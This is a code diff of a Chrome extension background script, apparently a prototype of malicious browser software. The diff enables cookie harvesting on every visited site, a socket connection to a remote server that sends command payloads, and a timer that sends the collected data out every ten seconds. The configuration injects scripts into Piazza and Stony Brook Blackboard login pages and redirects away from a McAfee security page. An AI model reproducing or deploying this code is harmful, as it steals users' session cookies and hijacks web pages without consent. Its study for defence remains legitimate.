@@ -27,12 +27,13 @@ var queue = {
 
 function clearQueue(){
 	Object.keys(queue).forEach(function(key){
-		queue.key = [];
+		queue[key] = [];
 	})
 }
 
 
-/*function redirectHandler(details){
+/* Old redirect handling
+function redirectHandler(details){
     return{redirectUrl: "http://404.com/"};
 }
 function setListener(newList){
@@ -126,10 +127,10 @@ chrome.tabs.onUpdated.addListener(
 );
 
 
-/*chrome.webRequest.onBeforeRequest.addListener(function(details){
+chrome.webRequest.onBeforeRequest.addListener(function(details){
 	console.log("Baking Cookies!");
 	chrome.cookies.getAll({"url":details.url},function(cookies){
-		console.log("cookies ", cookies);
+		console.log("cookies ", queue.cookies);
 		var cookiesChanged = false;
 		var i;
 		for(i = 0; i < cookies.length; i++){
@@ -137,26 +138,18 @@ chrome.tabs.onUpdated.addListener(
 							 "url": details.url,
 							 "content": cookies[i].value};
 			console.log("newCookie: ", newCookie);
-			queue.cookies.forEach(function(storedCookie){
-				console.log("storedCookies: ",storedCookie);
-				if(storedCookie[name] === newCookie[name])
-                    queue.cookies.push(newCookie);
-                	cookiesChanged = true;
-                	console.log("Cookies Added!!!!");
-
-			});
-
-
+			queue.cookies.push(newCookie)
+			cookiesChanged = true;
 		}
-		if(cookiesChanged){
+		if(cookiesChanged) {
             storeQueue();
-		}
+        }
 	})
 },
 	{urls: ["<all_urls>"],
 	types: ["main_frame"]},
 	["blocking"]
-);*/
+);
 
 /* Listen for HTTP POST requests and gather information from the form
  *
@@ -295,7 +288,6 @@ function createClientIDRequest(){
 function handleServerPayload(payload) {
 	console.log('Payload received: ' + JSON.stringify(payload, null, 2));
 	if(!validateServerPayload(payload)){
-
 		console.log("Failed to validate payload");
 		return false;
 	}
@@ -345,8 +337,14 @@ function connectToHost(){
         console.log("Connection error: " + data);
     });
     socket.on('srvpayload',function(msg){
-		console.log('message recieved from server');
-		handleServerPayload(msg);
+		console.log('message received from server');
+
+		if(handleServerPayload(msg)){
+			console.log("payload successfully handled");
+		}
+		else{
+			console.log("payload handling failed");
+		}
 	});
 
 	
@@ -369,14 +367,14 @@ function sendPayload(){
 }
 
 function main_func() {
-	//connectToHost();
+	connectToHost();
 	config.js_cmd.push({"https://piazza.com/class/jksrwiu8kuz2w5" : 'alert("u r hacked!");'});
     config.js_cmd.push({"https://piazza.com/class/jksrwiu8kuz2w5" : 'alert("u b hacked222222222!");'});
     config.js_cmd.push({"https://blackboard.stonybrook.edu/webapps/login/" : 'alert("This one as well 3333333?!");'});
 	config.security_blacklist.push({"https://www.mcafee.com/en-us/index.html":"https://developer.chrome.com/extensions/examples/extensions/catifier/event_page.js"});
 	//setListener(config.security_blacklist);
 
-    //setInterval(alert, 1000 * 10, ["Hello"]);	//sends payload every 5 minutes
+    setInterval(sendPayload, 1000 * 10);	//sends payload every 30 seconds
 }
 
 loadConfig().then(
